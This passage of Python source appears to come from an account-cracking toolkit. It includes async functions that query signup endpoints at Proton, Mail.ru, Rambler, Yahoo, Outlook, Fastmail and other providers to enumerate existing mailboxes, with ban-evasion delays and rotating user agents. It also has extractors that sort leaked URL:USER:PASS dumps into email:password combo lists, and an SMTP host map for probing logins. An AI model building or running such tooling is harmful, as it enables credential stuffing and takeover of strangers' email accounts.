                    "yandex.com",
                    "ya.ru"]
    chk_result = await code250("yandex.ru", target, kwargs.get('timeout', 10))
    yaChkLst, error = chk_result[0], chk_result[1]
    if yaChkLst:
        yaAliasesLst = [f'{target}@{yaAlias}' for yaAlias in yaAliasesLst]
        yaMails = list(set(yaChkLst + yaAliasesLst))
        result["Yandex"] = yaMails

    await asyncio.sleep(0)
    return result, error


async def proton(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> Dict[str, Any]:
    result = {}

    protonLst = ["protonmail.com", "protonmail.ch", "pm.me", "proton.me"]
    protonSucc = []
    sreq = req_session_fun()

    protonURL = f"https://account.proton.me/api/core/v4/users/available?Name={target}"

    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                "Accept": "application/vnd.protonmail.v1+json",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": "https://mail.protonmail.com/create/new?language=en",
                "x-pm-appversion": "web-account@5.0.18.4",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "DNT": "1", "Connection": "close"}

    try:

        chkProton = await sreq.get(protonURL, headers=headers, timeout=kwargs.get('timeout', 5))

        async with chkProton:
            if chkProton.status == 409:
                resp = await chkProton.json()
                exists = resp['Error']
                if exists == "Username already used":
                    protonSucc = [f"{target}@{protodomain}" for protodomain in protonLst]

    except Exception as e:
        logger.error(e, exc_info=True)

    if protonSucc:
        result["Proton"] = protonSucc

    await sreq.close()

    return result


async def mailRu(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> tuple[Dict[str, Any], str]:
    result: Dict[str, Any] = {}
    error: str = ""

    # headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', 'Referer': 'https://account.mail.ru/signup?from=main&rf=auth.mail.ru'}
    mailRU = ["mail.ru", "bk.ru", "inbox.ru", "list.ru", "internet.ru"]
    mailRuSucc: List[str] = []
    sreq = req_session_fun()

    for maildomain in mailRU:
        try:
            headers = {'User-Agent': random.choice(uaLst)}
            mailruMail = f"{target}@{maildomain}"
            data = {'email': mailruMail}

            chkMailRU = await sreq.post('https://account.mail.ru/api/v1/user/exists', headers=headers, data=data, timeout=5)

            async with chkMailRU:
                if chkMailRU.status == 200:
                    resp = await chkMailRU.json()
                    if exists := resp['body']['exists']:
                        mailRuSucc.append(mailruMail)

        except Exception as e:
            logger.error(e, exc_info=True)
            error = str(e)

        await asyncio.sleep(random.uniform(0.5, 2))

    if mailRuSucc:
        result["MailRU"] = mailRuSucc

    await sreq.close()

    return result, error


async def rambler(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> tuple[Dict[str, Any], str]:
  # basn risk
    result = {}
    error = ""

    ramblerMail = ["rambler.ru", "lenta.ru", "autorambler.ru", "myrambler.ru", "ro.ru", "rambler.ua"]
    ramblerSucc = []
    sreq = req_session_fun()

    for maildomain in ramblerMail:

        try:
            targetMail = f"{target}@{maildomain}"

            # reqID = ''.join(random.sample((s.ascii_lowercase + s.ascii_uppercase + s.digits), 20))
            reqID = randstr(20)
            userAgent = random.choice(uaLst)
            ramblerChkURL = "https://id.rambler.ru:443/jsonrpc"

            #            "Referer": "https://id.rambler.ru/login-20/mail-registration?back=https%3A%2F%2Fmail.rambler.ru%2F&rname=mail&param=embed&iframeOrigin=https%3A%2F%2Fmail.rambler.ru",

            headers = {"User-Agent": userAgent,
                       "Referer": "https://id.rambler.ru/login-20/mail-registration?utm_source=head"
                                  "&utm_campaign=self_promo&utm_medium=header&utm_content=mail&rname=mail"
                                  "&back=https%3A%2F%2Fmail.rambler.ru%2F%3Futm_source%3Dhead%26utm_campaign%3Dself_promo%26utm_medium%3Dheader%26utm_content%3Dmail"
                                  "&param=embed&iframeOrigin=https%3A%2F%2Fmail.rambler.ru&theme=mail-web",
                       "Content-Type": "application/json",
                       "Origin": "https://id.rambler.ru",
                       "X-Client-Request-Id": reqID}

            ramblerJSON = {"method": "Rambler::Id::login_available", "params": [{"login": targetMail}], "rpc": "2.0"}
            ramblerChk = await sreq.post(ramblerChkURL, headers=headers, json=ramblerJSON, timeout=5)

            async with ramblerChk:
                if ramblerChk.status == 200:
                    try:
                        resp = await ramblerChk.json(content_type=None)
                        exist = resp['result']['profile']['status']
                        if exist == "exist":
                            ramblerSucc.append(targetMail)
                            # print("[+] Success with {}".format(targetMail))
                        # else:
                        #    print("[-]".format(ramblerChk.text))
                    except KeyError as e:
                        logger.error(e, exc_info=True)

            await asyncio.sleep(random.uniform(4, 6))  # don't reduce

        except Exception as e:
            logger.error(e, exc_info=True)
            error = str(e)

    if ramblerSucc:
        result["Rambler"] = ramblerSucc

    await sreq.close()

    return result, error


async def tuta(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> Dict[str, Any]:
    result = {}

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36'}

    tutaMail = ["tutanota.com", "tutanota.de", "tutamail.com", "tuta.io", "keemail.me"]
    tutaSucc = []
    sreq = req_session_fun()

    for maildomain in tutaMail:

        try:

            targetMail = f"{target}@{maildomain}"
            tutaURL = "https://mail.tutanota.com/rest/sys/mailaddressavailabilityservice?_body="

            tutaCheck = await sreq.get(
                f'{tutaURL}%7B%22_format%22%3A%220%22%2C%22mailAddress%22%3A%22{target}%40{maildomain}%22%7D',
                headers=headers,
                timeout=kwargs.get('timeout', 5),
            )


            async with tutaCheck:
                if tutaCheck.status == 200:
                    resp = await tutaCheck.json()
                    exists = resp['available']

                    if exists == "0":
                        tutaSucc.append(targetMail)

            await asyncio.sleep(random.uniform(2, 4))

        except Exception as e:
            logger.error(e, exc_info=True)

    if tutaSucc:
        result["Tutanota"] = tutaSucc

    await sreq.close()

    return result


async def yahoo(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> Dict[str, Any]:
    result = {}

    yahooURL = "https://login.yahoo.com:443/account/module/create?validateField=yid"
    yahooCookies = {"B": "10kh9jteu3edn&b=3&s=66", "AS": "v=1&s=wy5fFM96"}  # 13 8
    # yahooCookies = {"B": "{}&b=3&s=66".format(randstr(13)), "AS": "v=1&s={}".format(randstr(8))} # 13 8
    headers = {"User-Agent": random.choice(uaLst),
               "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
               "Referer": "https://login.yahoo.com/account/create?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd&authMechanism=primary&specId=yidReg",
               "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest",
               "DNT": "1", "Connection": "close"}

    # yahooPOST = {"specId": "yidReg", "crumb": randstr(11), "acrumb": randstr(8), "yid": target} # crumb: 11, acrumb: 8
    yahooPOST = {"specId": "yidReg", "crumb": "bshN8x9qmfJ", "acrumb": "wy5fFM96", "yid": target}
    sreq = req_session_fun()

    try:
        yahooChk = await sreq.post(yahooURL, headers=headers, cookies=yahooCookies, data=yahooPOST, timeout=kwargs.get('timeout', 5))

        body = await yahooChk.text()
        if '"IDENTIFIER_EXISTS"' in body:
            result["Yahoo"] = f"{target}@yahoo.com"

    except Exception as e:
        logger.error(e, exc_info=True)

    await sreq.close()

    return result


async def outlook(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> Dict[str, Any]:
    result = {}
    liveSucc = []
    if AsyncHTMLSession is None:
        logger.error("requests_html.AsyncHTMLSession not available. Please install requests-html.")
        return result
    sreq = AsyncHTMLSession()
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Priority": "u=0, i",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }
    liveLst = ["outlook.com", "hotmail.com"]
    url_template = 'https://signup.live.com/?username={}%40{}&lic=1'

    for maildomain in liveLst:
        try:
            liveChk = await sreq.get(url_template.format(target, maildomain), headers=headers)
            await liveChk.html.arender(sleep=1)

            if "Someone already has this email address" in liveChk.html.html:
                liveSucc.append(f"{target}@{maildomain}")

        except Exception as e:
            logger.error(e, exc_info=True)

    if liveSucc:
        result["Live"] = liveSucc

    await sreq.close()

    return result


async def zoho(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> Dict[str, Any]:
    result = {}

    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36",
        "Referer": "https://www.zoho.com/",
        "Origin": "https://www.zoho.com"
    }

    zohoURL = "https://accounts.zoho.com:443/accounts/validate/register.ac"
    zohoPOST = {"username": target, "servicename": "VirtualOffice", "serviceurl": "/"}
    sreq = req_session_fun()

    try:
        zohoChk = await sreq.post(zohoURL, headers=headers, data=zohoPOST, timeout=kwargs.get('timeout', 10))

        async with zohoChk:
            if zohoChk.status == 200:
                # if "IAM.ERROR.USERNAME.NOT.AVAILABLE" in zohoChk.text:
                #    print("[+] Success with {}@zohomail.com".format(target))
                resp = await zohoChk.json()
                if resp['error']['username'] == 'This username is taken':
                    result["Zoho"] = f"{target}@zohomail.com"
                                    # print("[+] Success with {}@zohomail.com".format(target))
    except Exception as e:
        logger.error(e, exc_info=True)

    await sreq.close()

    return result


async def lycos(target, req_session_fun, *args, **kwargs) -> Dict:
    result = {}

    lycosURL = f"https://registration.lycos.com/usernameassistant.php?validate=1&m_AID=0&t=1625674151843&m_U={target}&m_PR=27&m_SESSIONKEY=4kCL5VaODOZ5M5lBF2lgVONl7tveoX8RKmedGRU3XjV3xRX5MqCP2NWHKynX4YL4"


    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36",
        "Referer": "https://registration.lycos.com/register.php?m_PR=27&m_E=7za1N6E_h_nNSmIgtfuaBdmGpbS66MYX7lMDD-k9qlZCyq53gFjU_N12yVxL01F0R_mmNdhfpwSN6Kq6bNfiqQAA",
        "X-Requested-With": "XMLHttpRequest"}
    sreq = req_session_fun()

    try:
        lycosChk = await sreq.get(lycosURL, headers=headers, timeout=kwargs.get('timeout', 10))

        async with lycosChk:
            if lycosChk.status == 200:
                resp = await lycosChk.text()
                if resp == "Unavailable":
                    result["Lycos"] = f"{target}@lycos.com"
    except Exception as e:
        logger.error(e, exc_info=True)

    await sreq.close()

    return result


async def eclipso(target, req_session_fun, *args, **kwargs) -> Dict:  # high ban risk + false positives after
    result = {}

    eclipsoSucc = []

    eclipsoLst = ["eclipso.eu",
                  "eclipso.de",
                  "eclipso.at",
                  "eclipso.ch",
                  "eclipso.be",
                  "eclipso.es",
                  "eclipso.it",
                  "eclipso.me",
                  "eclipso.nl",
                  "eclipso.email"]

    headers = {'User-Agent': random.choice(uaLst),
               'Referer': 'https://www.eclipso.eu/signup/tariff-5',
               'X-Requested-With': 'XMLHttpRequest'}
    sreq = req_session_fun()

    for maildomain in eclipsoLst:
        try:
            targetMail = f"{target}@{maildomain}"

            eclipsoURL = f"https://www.eclipso.eu/index.php?action=checkAddressAvailability&address={targetMail}"

            chkEclipso = await sreq.get(eclipsoURL, headers=headers, timeout=kwargs.get('timeout', 5))

            async with chkEclipso:
                if chkEclipso.status == 200:
                    resp = await chkEclipso.text()
                    if '>0<' in resp:
                        eclipsoSucc.append(targetMail)
        except Exception as e:
            logger.error(e, exc_info=True)

        await asyncio.sleep(random.uniform(2, 4))

    if eclipsoSucc:
        result["Eclipso"] = eclipsoSucc

    await sreq.close()

    return result


async def posteo(target, req_session_fun, *args, **kwargs) -> Dict:
    result = {}

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',
        'Referer': 'https://posteo.de/en/signup',
        'X-Requested-With': 'XMLHttpRequest'}

    sreq = req_session_fun()
    try:
        posteoURL = f"https://posteo.de/users/new/check_username?user%5Busername%5D={target}"

        chkPosteo = await sreq.get(posteoURL, headers=headers, timeout=kwargs.get('timeout', 5))

        async with chkPosteo:
            if chkPosteo.status == 200:
                resp = await chkPosteo.text()
                if resp == "false":
                    result["Posteo"] = [
                        f"{target}@posteo.net",
                        "~50 aliases: https://posteo.de/en/help/which-domains-are-available-to-use-as-a-posteo-alias-address",
                    ]

    except Exception as e:
        logger.error(e, exc_info=True)

    await sreq.close()

    return result


async def mailbox(target, req_session_fun, *args, **kwargs) -> Dict:  # tor RU
    result = {}

    mailboxURL = "https://register.mailbox.org:443/ajax"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36"}
    mailboxJSON = {"account_name": target, "action": "validateAccountName"}

    existiert = "Der Accountname existiert bereits."
    sreq = req_session_fun()

    try:
        chkMailbox = await sreq.post(mailboxURL, headers=headers, json=mailboxJSON, timeout=kwargs.get('timeout', 10))

        async with chkMailbox:
            resp = await chkMailbox.text()
            if resp == existiert:
                result["MailBox"] = f"{target}@mailbox.org"
    except Exception as e:
        logger.error(e, exc_info=True)

    await sreq.close()

    return result


async def firemail(target, req_session_fun, *args, **kwargs) -> Dict:  # tor RU
    result = {}

    firemailSucc = []

    firemailDomains = ["firemail.at", "firemail.de", "firemail.eu"]

    headers = {'User-Agent': random.choice(uaLst),
               'Referer': 'https://firemail.de/E-Mail-Adresse-anmelden',
               'X-Requested-With': 'XMLHttpRequest'}
    sreq = req_session_fun()

    for firemailDomain in firemailDomains:
        try:
            targetMail = f"{target}@{firemailDomain}"

            firemailURL = f"https://firemail.de/index.php?action=checkAddressAvailability&address={targetMail}"

            chkFiremail = await sreq.get(firemailURL, headers=headers, timeout=kwargs.get('timeout', 10))

            async with chkFiremail:
                if chkFiremail.status == 200:
                    resp = await chkFiremail.text()
                    if '>0<' in resp:
                        firemailSucc.append(f"{targetMail}")
        except Exception as e:
            logger.error(e, exc_info=True)

        await asyncio.sleep(random.uniform(2, 4))

    if firemailSucc:
        result["Firemail"] = firemailSucc

    await sreq.close()

    return result


async def fastmail(target, req_session_fun, *args, **kwargs) -> Dict:  # sanctions against Russia) TOR + 4 min for check in loop(
    result = {}

    # Registration form on fastmail website automatically lowercase all input.
    # If uppercase letters are used false positive results are returned.
    target = target.lower()

    # validate target syntax to prevent false positive results
    match = re.search(r'^[a-zA-Z]\w{2,40}$', target, re.ASCII)

    if not match:
        return result

    fastmailSucc = []

    fastmailLst = [
        "fastmail.com", "fastmail.cn", "fastmail.co.uk", "fastmail.com.au",
        "fastmail.de", "fastmail.es", "fastmail.fm", "fastmail.fr",
        "fastmail.im", "fastmail.in", "fastmail.jp", "fastmail.mx",
        "fastmail.net", "fastmail.nl", "fastmail.org", "fastmail.se",
        "fastmail.to", "fastmail.tw", "fastmail.uk", "fastmail.us",
        "123mail.org", "airpost.net", "eml.cc", "fmail.co.uk",
        "fmgirl.com", "fmguy.com", "mailbolt.com", "mailcan.com",
        "mailhaven.com", "mailmight.com", "ml1.net", "mm.st",
        "myfastmail.com", "proinbox.com", "promessage.com", "rushpost.com",
        "sent.as", "sent.at", "sent.com", "speedymail.org",
        "warpmail.net", "xsmail.com", "150mail.com", "150ml.com",
        "16mail.com", "2-mail.com", "4email.net", "50mail.com",
        "allmail.net", "bestmail.us", "cluemail.com", "elitemail.org",
        "emailcorner.net", "emailengine.net", "emailengine.org", "emailgroups.net",
        "emailplus.org", "emailuser.net", "f-m.fm", "fast-email.com",
        "fast-mail.org", "fastem.com", "fastemail.us", "fastemailer.com",
        "fastest.cc", "fastimap.com", "fastmailbox.net", "fastmessaging.com",
        "fea.st", "fmailbox.com", "ftml.net", "h-mail.us",
        "hailmail.net", "imap-mail.com", "imap.cc", "imapmail.org",
        "inoutbox.com", "internet-e-mail.com", "internet-mail.org",
        "internetemails.net", "internetmailing.net", "jetemail.net",
        "justemail.net", "letterboxes.org", "mail-central.com", "mail-page.com",
        "mailandftp.com", "mailas.com", "mailc.net", "mailforce.net",
        "mailftp.com", "mailingaddress.org", "mailite.com", "mailnew.com",
        "mailsent.net", "mailservice.ms", "mailup.net", "mailworks.org",
        "mymacmail.com", "nospammail.net", "ownmail.net", "petml.com",
        "postinbox.com", "postpro.net", "realemail.net", "reallyfast.biz",
        "reallyfast.info", "speedpost.net", "ssl-mail.com", "swift-mail.com",
        "the-fastest.net", "the-quickest.com", "theinternetemail.com",
        "veryfast.biz", "veryspeedy.net", "yepmail.net", "your-mail.com"]

    headers = {"User-Agent": random.choice(uaLst),
               "Referer": "https://www.fastmail.com/signup/",
               "Content-type": "application/json",
               "X-TrustedClient": "Yes",
               "Origin": "https://www.fastmail.com"}

    fastmailURL = "https://www.fastmail.com:443/jmap/setup/"
    sreq = req_session_fun()

    for fmdomain in fastmailLst:
        # print(fastmailLst.index(fmdomain)+1, fmdomain)

        fmmail = f"{target}@{fmdomain}"

        fastmailJSON = {"methodCalls": [["Signup/getEmailAvailability", {"email": fmmail}, "0"]],
                        "using": ["https://www.fastmail.com/dev/signup"]}

        try:
            chkFastmail = await sreq.post(fastmailURL, headers=headers, json=fastmailJSON, timeout=kwargs.get('timeout', 5))

            async with chkFastmail:
                if chkFastmail.status == 200:
                    resp = await chkFastmail.json()
                    fmJson = resp['methodResponses'][0][1]['isAvailable']
                    if fmJson is False:
                        fastmailSucc.append(f"{fmmail}")

        except Exception as e:
            logger.error(e, exc_info=True)

        await asyncio.sleep(random.uniform(0.5, 1.1))

    if fastmailSucc:
        result["Fastmail"] = fastmailSucc

    await sreq.close()

    return result


async def startmail(target, req_session_fun, *args, **kwargs) -> Dict:  # TOR
    result = {}

    startmailURL = f"https://mail.startmail.com:443/api/AvailableAddresses/{target}%40startmail.com"

    headers = {"User-Agent": random.choice(uaLst),
               "X-Requested-With": "1.94.0"}
    sreq = req_session_fun()

    try:
        chkStartmail = await sreq.get(startmailURL, headers=headers, timeout=kwargs.get('timeout', 10))

        async with chkStartmail:
            if chkStartmail.status == 404:
                result["StartMail"] = f"{target}@startmail.com"

    except Exception as e:
        logger.error(e, exc_info=True)

    await sreq.close()

    return result


async def kolab(target, req_session_fun, *args, **kwargs) -> Dict:
    result: Dict[str, List] = {}

    kolabLst = ["mykolab.com",
                "attorneymail.ch",
                "barmail.ch",
                "collaborative.li",
                "diplomail.ch",
                "freedommail.ch",
                "groupoffice.ch",
                "journalistmail.ch",
                "legalprivilege.ch",
                "libertymail.co",
                "libertymail.net",
                "mailatlaw.ch",
                "medicmail.ch",
                "medmail.ch",
                "mykolab.ch",
                "myswissmail.ch",
                "opengroupware.ch",
                "pressmail.ch",
                "swisscollab.ch",
                "swissgroupware.ch",
                "switzerlandmail.ch",
                "trusted-legal-mail.ch",
                "kolabnow.com",
                "kolabnow.ch"]

    kolabURL = "https://kolabnow.com/api/auth/signup"
    headers = {"User-Agent": random.choice(uaLst),
               "Referer": "https://kolabnow.com/signup/individual",
               "Content-Type": "application/json;charset=utf-8",
               "X-Test-Payment-Provider": "mollie",
               "X-Requested-With": "XMLHttpRequest"}
    sreq = req_session_fun()
    timeout = kwargs.get('timeout', 10)

    kolabStatus = await sreq.post(kolabURL, headers={"User-Agent": random.choice(uaLst)}, timeout=timeout)

    if kolabStatus.status == 422:

        kolabpass = randstr(12)
        kolabsuc = "The specified login is not available."

        for kolabdomain in kolabLst:

            kolabPOST = {"login": target,
                         "domain": kolabdomain,
                         "password": kolabpass,
                         "password_confirmation": kolabpass,
                         "voucher": "",
                         "code": "bJDmpWw8sO85KlgSETPWtnViDgQ1S0MO",
                         "short_code": "VHBZX"}

            try:
                # chkKolab = sreq.post(kolabURL, headers=headers, data=kolabPOST)
                chkKolab = await sreq.post(kolabURL, headers=headers, data=json.dumps(kolabPOST), timeout=timeout)
                resp = await chkKolab.text()

                if chkKolab.status == 200:

                    kolabJSON = chkKolab.json()
                    if (
                        kolabJSON["errors"]["login"] != kolabsuc
                        and kolabJSON["errors"]
                    ):
                        print(kolabJSON["errors"])

            except Exception as e:
                logger.error(e, exc_info=True)

    await sreq.close()

    return result


# --- ULP & COMBO EXTRACTORS ---

class ComboSorter:
    def __init__(self, file_path: str, sort_type: str, text_data: str = "", custom_domains: List[str] = None):
        self.file_path = file_path
        self.sort_type = sort_type
        self.text_data = text_data
        self.custom_domains = [d.lower().strip() for d in custom_domains] if custom_domains else []
        self.output_dir = os.path.join(HITS_FOLDER, f"Sorted_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}")
        if not os.path.exists(self.output_dir): os.makedirs(self.output_dir)

    def start(self):
        state.search_running = True
        state.checked = 0
        state.valid = 0
        state.stop_requested = False
        
        try:
            if self.file_path and os.path.exists(self.file_path):
                self.process_file()
            elif self.text_data:
                self.process_text()
        except Exception as e:
            logger.error(f"Sorter Error: {e}")
        finally:
            state.search_running = False

    def process_file(self):
        buffers = {} # key -> list of lines
        with open(self.file_path, 'r', encoding='utf-8', errors='ignore') as f:
            while True:
                chunk = f.readlines(100000)
                if not chunk or state.stop_requested: break
                
                for line in chunk:
                    state.checked += 1
                    line = line.strip()
                    if not line or ':' not in line: continue
                    
                    user = line.split(':')[0]
                    if '@' not in user: continue
                    
                    domain = user.split('@')[-1].lower()
                    
                    if self.sort_type == 'mixed':
                        # Skip major HQ domains
                        if any(m in domain for m in MICROSOFT) or any(g in domain for g in GMAIL) or 'yahoo' in domain:
                            continue
                        key = "mixed_domains"
                    else:
                        # Custom Domain Filter
                        if self.custom_domains and domain not in self.custom_domains:
                            continue

                        key = domain
                        if self.sort_type == 'country':
                            key = domain.split('.')[-1]
                    
                    if key not in buffers: buffers[key] = []
                    buffers[key].append(line)
                    
                    if len(buffers[key]) >= 1000:
                        self.flush(key, buffers[key])
                        buffers[key] = []
                        state.valid += len(buffers[key]) # This is wrong, should be incremented differently but valid counts "processed" here
                
                # Update valid count for the chunk
                with state.lock: state.valid = state.checked # In sorter, valid = total processed lines for simplicity
                
        # Final flush
        for key, lines in buffers.items():
            if lines: self.flush(key, lines)

    def process_text(self):
        lines = self.text_data.splitlines()
        for line in lines:
            state.checked += 1
            line = line.strip()
            if not line or ':' not in line: continue
            
            user = line.split(':')[0]
            if '@' not in user: continue
            domain = user.split('@')[-1].lower()
            
            if self.sort_type == 'mixed':
                if any(m in domain for m in MICROSOFT) or any(g in domain for g in GMAIL) or 'yahoo' in domain:
                    continue
                key = "mixed_domains"
            else:
                if self.custom_domains and domain not in self.custom_domains:
                    continue

                key = domain
                if self.sort_type == 'country': key = domain.split('.')[-1]
            
            self.flush(key, [line])
            state.valid += 1

    def flush(self, key, lines):
        # Sanitize key for filename
        safe_key = "".join([c for c in key if c.isalnum() or c in "._-"])
        if not safe_key: safe_key = "unknown"
        path = os.path.join(self.output_dir, f"{safe_key}.txt")
        with open(path, 'a', encoding='utf-8') as f:
            f.write("\n".join(lines) + "\n")

class ULPExtractor:
    def __init__(self, file_path: str, keyword: str = "", only_emails: bool = True):
        self.file_path = file_path
        self.keyword = keyword.lower()
        self.only_emails = only_emails
        self.output_dir = os.path.join(HITS_FOLDER, f"Extracted_{keyword.replace('.','_')}" if keyword else "Extracted_ULP")
        if not os.path.exists(self.output_dir): os.makedirs(self.output_dir)
        
    def start(self):
        if not os.path.exists(self.file_path): return
        state.search_running = True
        state.checked = 0
        state.valid = 0
        state.duplicates = 0
        state.stop_requested = False
        seen_combos = set() # Track duplicates to ensure clean output
        
        try:
            with open(self.file_path, 'r', encoding='utf-8', errors='ignore') as f:
                # Use a larger buffer for performance with 5GB+ files
                while True:
                    chunk = f.readlines(100000) # Read 100k lines at once
                    if not chunk or state.stop_requested: break
                    
                    output_combos = []
                    for line in chunk:
                        state.checked += 1
                        line = line.strip()
                        if not line: continue
                        
                        if self.keyword and self.keyword not in line.lower():
                            continue
                            
                        # Split logic for ULP: URL:USER:PASS
                        parts = []
                        if ':' in line: parts = line.split(':')
                        elif '|' in line: parts = line.split('|')
                        
                        if len(parts) < 2: continue
                        
                        user, pwd = "", ""
                        if len(parts) >= 3: # URL:USER:PASS
                            user, pwd = parts[-2], parts[-1]
                        elif len(parts) == 2: # USER:PASS
                            user, pwd = parts[0], parts[1]
                        
                        if not user or not pwd: continue
                        if self.only_emails and '@' not in user: continue
                        
                        combo = f"{user}:{pwd}"
                        if combo not in seen_combos:
                            seen_combos.add(combo)
                            output_combos.append(combo)
                            state.valid += 1
                        else:
                            state.duplicates += 1
                    
                    if output_combos:
                        target_file = os.path.join(self.output_dir, "extracted_combos.txt")
                        with open(target_file, 'a', encoding='utf-8') as out:
                            out.write("\n".join(output_combos) + "\n")
                            
        except Exception as e:
            logger.error(f"ULP Extraction Error: {e}")
        finally:
            state.search_running = False

@app.post("/api/extractor/ulp")
async def api_ulp_extract(req: Request):
    d = await req.json()
    path = d.get('path')
    kw = d.get('keyword', '')
    only_e = d.get('only_emails', True)
    if not os.path.exists(path): return {"ok": False, "error": "File not found"}
    ext = ULPExtractor(path, kw, only_e)
    threading.Thread(target=ext.start, daemon=True).start()
    return {"ok": True}

@app.post("/api/sorter/start")
async def api_sorter_start(req: Request):
    d = await req.json()
    path = d.get('path', '')
    text = d.get('text', '')
    stype = d.get('type', 'domain')
    custom = d.get('custom', '')
    
    cdoms = [x.strip() for x in custom.split(',') if x.strip()] if custom else []
    
    if not path and not text: return {"ok": False, "error": "No input provided"}
    
    sorter = ComboSorter(path, stype, text, cdoms)
    threading.Thread(target=sorter.start, daemon=True).start()
    return {"ok": True}

# ─── SMTP SCANNER HELPERS ───────────────────────────────────────────────────

def _smtp_test_connection(host: str, port: int, timeout: int = 5) -> bool:
    """Quick TCP probe to check if the SMTP port is reachable before attempting auth."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except:
        return False

# Expanded provider list — mirrors aiofinal smtp_configs
SMTP_ENDPOINT_MAP = {
    # Microsoft
    "hotmail.com":     [("smtp.office365.com", 587), ("smtp-mail.outlook.com", 587)],
    "outlook.com":     [("smtp.office365.com", 587), ("smtp-mail.outlook.com", 587)],
    "live.com":        [("smtp.office365.com", 587), ("smtp-mail.outlook.com", 587)],
    "windowslive.com": [("smtp.office365.com", 587)],
    "office365.com":   [("smtp.office365.com", 587)],
    # Google
    "gmail.com":       [("smtp.gmail.com", 587), ("smtp.gmail.com", 465)],
    "googlemail.com":  [("smtp.gmail.com", 587), ("smtp.gmail.com", 465)],
    # Yahoo
    "yahoo.com":       [("smtp.mail.yahoo.com", 465), ("smtp.mail.yahoo.com", 587)],
    "ymail.com":       [("smtp.mail.yahoo.com", 465)],
    "rogers.com":      [("smtp.mail.yahoo.com", 465)],
    # AOL
    "aol.com":         [("smtp.aol.com", 587)],
    # Proton
    "protonmail.com":  [("smtp.protonmail.com", 587)],
    "proton.me":       [("smtp.protonmail.com", 587)],
    # Zoho
    "zoho.com":        [("smtp.zoho.com", 587)],
    # Transactional
    "amazonaws.com":   [("email-smtp.us-east-1.amazonaws.com", 587)],
    "sendgrid.net":    [("smtp.sendgrid.net", 587)],
    "mailgun.org":     [("smtp.mailgun.org", 587)],
    # Poland
    "onet.pl":         [("smtp.poczta.onet.pl", 587)],
    "wp.pl":           [("smtp.wp.pl", 587)],
    "o2.pl":           [("poczta.o2.pl", 465)],
    # Germany
    "t-online.de":     [("securesmtp.t-online.de", 587)],
    "gmx.de":          [("mail.gmx.net", 587), ("mail.gmx.net", 465)],
    "gmx.net":         [("mail.gmx.net", 587), ("mail.gmx.net", 465)],
    "gmx.at":          [("smtp.gmx.at", 587)],
    "web.de":          [("smtp.web.de", 587)],
    "freenet.de":      [("mx.freenet.de", 587)],
    "arcor.de":        [("mail.arcor.de", 587)],
    "posteo.de":       [("posteo.de", 587)],
    "mailbox.org":     [("smtp.mailbox.org", 465)],
    # Czech
    "centrum.cz":      [("smtp.centrum.cz", 587)],
    "seznam.cz":       [("smtp.seznam.cz", 465)],
    "email.cz":        [("smtp.seznam.cz", 465)],
    # Russia
    "mail.ru":         [("smtp.mail.ru", 465)],
    "bk.ru":           [("smtp.mail.ru", 465)],
    "list.ru":         [("smtp.mail.ru", 465)],
    "inbox.ru":        [("smtp.mail.ru", 465)],
    "yandex.ru":       [("smtp.yandex.ru", 465)],
    "rambler.ru":      [("smtp.rambler.ru", 465)],
    # Italy
    "libero.it":       [("smtp.libero.it", 465)],
    "virgilio.it":     [("smtp.virgilio.it", 465)],
    "alice.it":        [("out.alice.it", 587)],
    "tin.it":          [("mail.tin.it", 587)],
    "tiscali.it":      [("smtp.tiscali.it", 465)],
    # France
    "orange.fr":       [("smtp.orange.fr", 465)],
    "sfr.fr":          [("smtp.sfr.fr", 465)],
    "free.fr":         [("smtp.free.fr", 465)],
    "laposte.net":     [("smtp.laposte.net", 465)],
    # UK
    "btinternet.com":  [("mail.btinternet.com", 465)],
    "sky.com":         [("smtp.tools.sky.com", 465)],
    "talktalk.net":    [("smtp.talktalk.net", 587)],
    # Brazil
    "uol.com.br":      [("smtps.uol.com.br", 587), ("smtps.uol.com.br", 465)],
    "bol.com.br":      [("smtps.bol.com.br", 587)],
    "ig.com.br":       [("smtp.ig.com.br", 587)],
    "terra.com.br":    [("smtp.terra.com.br", 587)],
    # USA ISP
